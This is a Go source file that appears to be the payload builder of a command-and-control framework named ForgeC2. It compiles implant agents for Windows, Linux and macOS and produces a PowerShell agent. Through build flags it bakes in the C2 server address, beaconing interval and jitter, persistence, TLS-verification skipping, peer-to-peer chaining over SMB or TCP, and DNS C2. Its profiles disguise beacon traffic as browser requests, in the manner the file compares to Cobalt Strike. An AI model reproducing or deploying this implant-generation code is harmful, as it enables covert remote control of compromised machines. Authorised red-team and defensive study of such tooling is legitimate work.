package payload

import (
	"bytes"
	"embed"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"text/template"
)

//go:embed agent/* powershell_template.ps1 profiles/*
var payloadFS embed.FS

// getGoCmd returns the path to the Go executable.
// It first tries exec.LookPath, then common installation locations (especially useful
// on Windows when the server.exe is launched without a full user PATH, e.g. by double-click).
func getGoCmd() (string, error) {
	// Allow overriding via environment (advanced users / CI)
	if goBinary := os.Getenv("GO_BINARY"); goBinary != "" {
		if _, err := os.Stat(goBinary); err == nil {
			return goBinary, nil
		}
		return goBinary, nil // will fail at exec time with clear path
	}

	// Standard PATH lookup
	if goPath, err := exec.LookPath("go"); err == nil {
		return goPath, nil
	}

	// Windows-specific fallbacks (very common issue when running built .exe)
	if runtime.GOOS == "windows" {
		home := os.Getenv("USERPROFILE")
		candidates := []string{
			filepath.Join(home, "go", "bin", "go.exe"),
			`C:\Program Files\Go\bin\go.exe`,
			`C:\Program Files (x86)\Go\bin\go.exe`,
		}

		// Support the user's common sdk layout (e.g. C:\Users\xxx\sdk\go1.xx\bin\go.exe)
		if sdkDir := filepath.Join(home, "sdk"); true {
			if entries, err := os.ReadDir(sdkDir); err == nil {
				for _, e := range entries {
					if strings.HasPrefix(strings.ToLower(e.Name()), "go") {
						c := filepath.Join(sdkDir, e.Name(), "bin", "go.exe")
						candidates = append(candidates, c)
					}
				}
			}
		}

		if goroot := os.Getenv("GOROOT"); goroot != "" {
			candidates = append(candidates, filepath.Join(goroot, "bin", "go.exe"))
		}
		if gopath := os.Getenv("GOPATH"); gopath != "" {
			candidates = append(candidates, filepath.Join(gopath, "bin", "go.exe"))
		}

		for _, c := range candidates {
			if _, err := os.Stat(c); err == nil {
				return c, nil
			}
		}
	}

	return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable to the full path of go.exe/go")
}

// loadMalleableProfile loads a profile from embedded FS or falls back to default.
func loadMalleableProfile(name string) MalleableProfile {
	if name == "" {
		name = "default"
	}
	profilePath := fmt.Sprintf("profiles/%s.json", name)
	data, err := payloadFS.ReadFile(profilePath)
	if err != nil {
		// fallback default
		return MalleableProfile{
			Name:      "default",
			UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
			BeaconURI: "/api/v1/beacon",
			Method:    "POST",
			Headers:   map[string]string{"Accept": "*/*"},
			Sleep:     10,
			Jitter:    20,
		}
	}
	var p MalleableProfile
	if err := json.Unmarshal(data, &p); err != nil {
		// return default on error
		return MalleableProfile{Name: name, BeaconURI: "/api/v1/beacon", Method: "POST"}
	}
	if p.BeaconURI == "" {
		p.BeaconURI = "/api/v1/beacon"
	}
	if p.Method == "" {
		p.Method = "POST"
	}
	return p
}

// MalleableProfile defines customizable beacon behavior similar to Cobalt Strike.
type MalleableProfile struct {
	Name        string            `json:"name"`
	Description string            `json:"description"`
	UserAgent   string            `json:"user_agent"`
	BeaconURI   string            `json:"beacon_uri"`
	Method      string            `json:"method"` // GET or POST
	Headers     map[string]string `json:"headers"`
	Sleep       int               `json:"sleep"`
	Jitter      int               `json:"jitter"`
}

// AgentConfig holds parameters injected into the generated agent (EXE or PS1).
// All agents must be produced exclusively through the Generate page.
type AgentConfig struct {
	C2URL         string
	Protocol      string // http, tcp, p2p
	Interval      int
	Jitter        int
	UserAgent     string
	Persist       bool
	SkipTLSVerify bool
	Filename      string // for output name
	Debug         bool   // for debug agent (shows console logs)
	Profile       string // malleable profile name
	BeaconURI     string
	Method        string
	ListenerID    uint
	P2PMode       string // "", "smb", "tcp" — how parent listens for children
	P2PParent     string // parent agent addr to connect to (child mode)
	P2PListenAddr string // parent listen addr (pipe name or tcp addr)
	DNSDomain     string // DNS C2 domain (e.g. "c2.example.com")
	DNSServer     string // DNS C2 server IP
	Proxy         string // HTTP proxy URL (e.g. "http://proxy:8080")
}

// GenerateWindowsEXE builds the Windows agent EXE (only via Generate page) using the embedded agent source + ldflags injection.
func GenerateWindowsEXE(cfg AgentConfig, outputDir string) (string, error) {
	if cfg.C2URL == "" {
		cfg.C2URL = "http://127.0.0.1:8080"
	}
	if cfg.Interval == 0 {
		cfg.Interval = 10
	}
	if cfg.Jitter == 0 {
		cfg.Jitter = 20
	}
	if cfg.UserAgent == "" {
		cfg.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	}
	profile := loadMalleableProfile(cfg.Profile)
	if cfg.UserAgent == "" {
		cfg.UserAgent = profile.UserAgent
	}
	if cfg.Interval == 0 && profile.Sleep > 0 {
		cfg.Interval = profile.Sleep
	}
	if cfg.Jitter == 0 && profile.Jitter > 0 {
		cfg.Jitter = profile.Jitter
	}

	// Create temp build dir
	tmpDir, err := os.MkdirTemp("", "forgec2-agent-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	// Make outputDir absolute to avoid issues with cmd.Dir
	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}

	// Write agent source files from embed (supports agent.go + platform-specific agent_*.go)
	if err := extractAgentSources(payloadFS, tmpDir); err != nil {
		return "", err
	}

	// go.mod with required external dependencies
	goMod := `module agent

go 1.25

require (
	github.com/Microsoft/go-winio v0.6.2
	golang.org/x/sys v0.42.0
)
`

	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}

	// Also write go.sum entries for the two deps
	goSum := `github.com/Microsoft/go-winio v0.6.2 h1:F2VQgta7ecxGYO8k3ZZz3RS8fVIXVxONVUPlNERoyfY=
github.com/Microsoft/go-winio v0.6.2/go.mod h1:yd8OoFMLzJbo9gZq8j5qaps8bJ9aShtEA8Ipt1oGCvU=
golang.org/x/sys v0.42.0 h1:omrd2nAlyT5ESRdCLYdm3+fMfNFE/+Rf4bDIQImRJeo=
golang.org/x/sys v0.42.0/go.mod h1:4GL1E5IUh+htKOUEOaiffhrAeqysfVGipDYzABqnCmw=
`
	if err := os.WriteFile(filepath.Join(tmpDir, "go.sum"), []byte(goSum), 0644); err != nil {
		return "", err
	}

	// ldflags to inject vars - properly quoted to handle spaces/special chars in UserAgent etc.
	// Note: only string vars can be set with -X, so we target the *Str versions (parsed inside agent).
	userAgent := cfg.UserAgent
	persist := "false"
	if cfg.Persist {
		persist = "true"
	}
	skipTLS := "false"
	if cfg.SkipTLSVerify {
		skipTLS = "true"
	}

	// Helper to escape for ldflags -X "key=value"
	escape := func(s string) string {
		s = strings.ReplaceAll(s, `\`, `\\`)
		s = strings.ReplaceAll(s, `"`, `\"`)
		return s
	}

	p2pMode := cfg.P2PMode
	if p2pMode == "" && cfg.Protocol == "p2p" {
		p2pMode = "tcp" // default P2P mode
	}
	var p2pParent, p2pListenAddr string
	if cfg.P2PParent != "" {
		p2pParent = cfg.P2PParent
	}
	if cfg.P2PListenAddr != "" {
		p2pListenAddr = cfg.P2PListenAddr
	}

	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s"`,
		escape(cfg.C2URL),
		cfg.Interval,
		cfg.Jitter,
		escape(userAgent),
		persist,
		skipTLS,
		cfg.Protocol,
		fmt.Sprintf("%t", cfg.Debug),
		escape(profile.BeaconURI),
		profile.Method,
		escape(p2pMode),
		escape(p2pParent),
		escape(p2pListenAddr),
		escape(cfg.DNSDomain),
		escape(cfg.DNSServer),
		escape(cfg.Proxy),
	)

	// Output filename
	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent.exe"
	}
	if !strings.HasSuffix(strings.ToLower(outName), ".exe") {
		outName += ".exe"
	}
	outPath := filepath.Join(outputDir, outName)
	if !filepath.IsAbs(outPath) {
		if abs, err := filepath.Abs(outPath); err == nil {
			outPath = abs
		}
	}
	// ensure the dir for outPath exists (use abs dir)
	outDir := filepath.Dir(outPath)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}

	// Run go mod tidy to resolve dependencies
	goCmd, err := getGoCmd()
	if err != nil {
		return "", err
	}
	tidyCmd := exec.Command(goCmd, "mod", "tidy")
	tidyCmd.Dir = tmpDir
	var tidyOut, tidyErr bytes.Buffer
	tidyCmd.Stdout = &tidyOut
	tidyCmd.Stderr = &tidyErr
	if err := tidyCmd.Run(); err != nil {
		return "", fmt.Errorf("go mod tidy failed: %w\n%s\n%s", err, tidyOut.String(), tidyErr.String())
	}

	// Build command - use explicit GOOS/GOARCH
	cmd := exec.Command(goCmd, "build",
		"-ldflags", ldflags,
		"-o", outPath,
		"-trimpath",
		".",
	)
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(),
		"GOOS=windows",
		"GOARCH=amd64",
		"CGO_ENABLED=0",
	)

	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("go build failed: %w\n%s", err, stderr.String())
	}

	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}

	return outPath, nil
}

// GeneratePowerShellSource returns the complete PowerShell agent source code
// after executing the external template. This is the single source of truth.
func GeneratePowerShellSource(cfg AgentConfig) (string, error) {
	if cfg.C2URL == "" {
		cfg.C2URL = "http://127.0.0.1:8080"
	}
	if cfg.Interval == 0 {
		cfg.Interval = 10
	}
	if cfg.Jitter == 0 {
		cfg.Jitter = 20
	}
	if cfg.UserAgent == "" {
		cfg.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	}
	if cfg.Protocol == "" {
		cfg.Protocol = "http"
	}

	profile := loadMalleableProfile(cfg.Profile)
	if cfg.UserAgent == "" {
		cfg.UserAgent = profile.UserAgent
	}
	if cfg.Interval == 0 && profile.Sleep > 0 {
		cfg.Interval = profile.Sleep
	}
	if cfg.Jitter == 0 && profile.Jitter > 0 {
		cfg.Jitter = profile.Jitter
	}
	cfg.BeaconURI = profile.BeaconURI
	cfg.Method = profile.Method

	tmplContent, err := payloadFS.ReadFile("powershell_template.ps1")
	if err != nil {
		return "", fmt.Errorf("powershell template not found in embed: %w", err)
	}

	tmpl, err := template.New("ps1").Parse(string(tmplContent))
	if err != nil {
		return "", err
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, cfg); err != nil {
		return "", err
	}
	return buf.String(), nil
}

// GeneratePowerShell creates a .ps1 agent file on disk (only via Generate page).
// Internally uses the full template.
func GeneratePowerShell(cfg AgentConfig, outputDir string) (string, error) {
	ps1Code, err := GeneratePowerShellSource(cfg)
	if err != nil {
		return "", err
	}

	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent.ps1"
	}
	outPath := filepath.Join(outputDir, outName)
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return "", err
	}
	if err := os.WriteFile(outPath, []byte(ps1Code), 0644); err != nil {
		return "", err
	}
	return outPath, nil
}

// extractAgentSources writes the required Go agent source files (common + platform)
// from the embedded FS into the temp build directory. This enables cross-platform
// builds (windows/linux) with correct build-tagged files.
func extractAgentSources(efs embed.FS, dir string) error {
	files := []string{
		"agent/agent.go",
		"agent/agent_windows.go",
		"agent/agent_linux.go",
		"agent/bof.go",
		"agent/peloader.go",
		"agent/dns.go",
	}
	for _, f := range files {
		data, err := efs.ReadFile(f)
		if err != nil {
			// platform file may be optional in some future, but require core
			if f == "agent/agent.go" {
				return fmt.Errorf("failed to read embedded %s: %w", f, err)
			}
			continue // ignore missing platform for now
		}
		base := filepath.Base(f)
		if err := os.WriteFile(filepath.Join(dir, base), data, 0644); err != nil {
			return err
		}
	}
	return nil
}

// GenerateLinuxELF builds a Linux ELF agent binary via cross-compilation.
func GenerateLinuxELF(cfg AgentConfig, outputDir string) (string, error) {
	if cfg.C2URL == "" {
		cfg.C2URL = "http://127.0.0.1:8080"
	}
	if cfg.Interval == 0 {
		cfg.Interval = 10
	}
	if cfg.Jitter == 0 {
		cfg.Jitter = 20
	}
	if cfg.UserAgent == "" {
		cfg.UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
	}
	if cfg.Protocol == "" {
		cfg.Protocol = "http"
	}

	profile := loadMalleableProfile(cfg.Profile)
	if cfg.UserAgent == "" {
		cfg.UserAgent = profile.UserAgent
	}
	if cfg.Interval == 0 && profile.Sleep > 0 {
		cfg.Interval = profile.Sleep
	}
	if cfg.Jitter == 0 && profile.Jitter > 0 {
		cfg.Jitter = profile.Jitter
	}

	tmpDir, err := os.MkdirTemp("", "forgec2-agent-linux-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}

	if err := extractAgentSources(payloadFS, tmpDir); err != nil {
		return "", err
	}

	goMod := `module agent

go 1.25
`
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}

	userAgent := cfg.UserAgent
	persist := "false"
	if cfg.Persist {
		persist = "true"
	}
	skipTLS := "false"
	if cfg.SkipTLSVerify {
		skipTLS = "true"
	}

	escape := func(s string) string {
		s = strings.ReplaceAll(s, `\`, `\\`)
		s = strings.ReplaceAll(s, `"`, `\"`)
		return s
	}

	p2pMode := cfg.P2PMode
	if p2pMode == "" && cfg.Protocol == "p2p" {
		p2pMode = "tcp"
	}
	var p2pParent, p2pListenAddr string
	if cfg.P2PParent != "" {
		p2pParent = cfg.P2PParent
	}
	if cfg.P2PListenAddr != "" {
		p2pListenAddr = cfg.P2PListenAddr
	}

	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s"`,
		escape(cfg.C2URL),
		cfg.Interval,
		cfg.Jitter,
		escape(userAgent),
		persist,
		skipTLS,
		cfg.Protocol,
		fmt.Sprintf("%t", cfg.Debug),
		escape(profile.BeaconURI),
		profile.Method,
		escape(p2pMode),
		escape(p2pParent),
		escape(p2pListenAddr),
		escape(cfg.DNSDomain),
		escape(cfg.DNSServer),
		escape(cfg.Proxy),
	)

	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent"
	}
	// Linux binaries typically have no .exe
	if strings.HasSuffix(strings.ToLower(outName), ".exe") {
		outName = outName[:len(outName)-4]
	}
	outPath := filepath.Join(outputDir, outName)
	if !filepath.IsAbs(outPath) {
		if abs, err := filepath.Abs(outPath); err == nil {
			outPath = abs
		}
	}
	outDir := filepath.Dir(outPath)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}

	goCmd, err := getGoCmd()
	if err != nil {
		return "", err
	}
	cmd := exec.Command(goCmd, "build",
		"-ldflags", ldflags,
		"-o", outPath,
		"-trimpath",
		".",
	)
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(),
		"GOOS=linux",
		"GOARCH=amd64",
		"CGO_ENABLED=0",
	)

	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("go build (linux) failed: %w\n%s", err, stderr.String())
	}

	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}

	return outPath, nil
}

// GenerateMacOS builds a macOS agent binary via cross-compilation.
func GenerateMacOS(cfg AgentConfig, outputDir string) (string, error) {
	if cfg.C2URL == "" {
		cfg.C2URL = "http://127.0.0.1:8080"
	}
	if cfg.Interval == 0 {
		cfg.Interval = 10
	}
	if cfg.Jitter == 0 {
		cfg.Jitter = 20
	}
	if cfg.UserAgent == "" {
		cfg.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
	}
	if cfg.Protocol == "" {
		cfg.Protocol = "http"
	}

	profile := loadMalleableProfile(cfg.Profile)
	if cfg.UserAgent == "" {
		cfg.UserAgent = profile.UserAgent
	}
	if cfg.Interval == 0 && profile.Sleep > 0 {
		cfg.Interval = profile.Sleep
	}
	if cfg.Jitter == 0 && profile.Jitter > 0 {
		cfg.Jitter = profile.Jitter
	}

	tmpDir, err := os.MkdirTemp("", "forgec2-agent-macos-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}

	if err := extractAgentSources(payloadFS, tmpDir); err != nil {
		return "", err
	}

	goMod := `module agent

go 1.25
`
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}

	userAgent := cfg.UserAgent
	persist := "false"
	if cfg.Persist {
		persist = "true"
	}
	skipTLS := "false"
	if cfg.SkipTLSVerify {
		skipTLS = "true"
	}

	escape := func(s string) string {
		s = strings.ReplaceAll(s, `\`, `\\`)
		s = strings.ReplaceAll(s, `"`, `\"`)
		return s
	}

	p2pMode := cfg.P2PMode
	if p2pMode == "" && cfg.Protocol == "p2p" {
		p2pMode = "tcp"
	}
	var p2pParent, p2pListenAddr string
	if cfg.P2PParent != "" {
		p2pParent = cfg.P2PParent
	}
	if cfg.P2PListenAddr != "" {
		p2pListenAddr = cfg.P2PListenAddr
	}

	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s"`,
		escape(cfg.C2URL),
		cfg.Interval,
		cfg.Jitter,
		escape(userAgent),
		persist,
		skipTLS,
		cfg.Protocol,
		fmt.Sprintf("%t", cfg.Debug),
		escape(profile.BeaconURI),
		profile.Method,
		escape(p2pMode),
		escape(p2pParent),
		escape(p2pListenAddr),
		escape(cfg.DNSDomain),
		escape(cfg.DNSServer),
		escape(cfg.Proxy),
	)

	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent"
	}
	// macOS binaries typically have no extension
	if strings.HasSuffix(strings.ToLower(outName), ".exe") {
		outName = outName[:len(outName)-4]
	}
	outPath := filepath.Join(outputDir, outName)
	if !filepath.IsAbs(outPath) {
		if abs, err := filepath.Abs(outPath); err == nil {
			outPath = abs
		}
	}
	outDir := filepath.Dir(outPath)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}

	goCmd, err := getGoCmd()
	if err != nil {
		return "", err
	}
	cmd := exec.Command(goCmd, "build",
		"-ldflags", ldflags,
		"-o", outPath,
		"-trimpath",
		".",
	)
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(),
		"GOOS=darwin",
		"GOARCH=amd64",
		"CGO_ENABLED=0",
	)

	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("go build (macos) failed: %w\n%s", err, stderr.String())
	}

	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}

	return outPath, nil
}

// Note: Agents are ONLY produced via the Generate page (EXE + PS1 + Linux ELF + macOS).
// The PS1 template lives in powershell_template.ps1 as the canonical implementation.
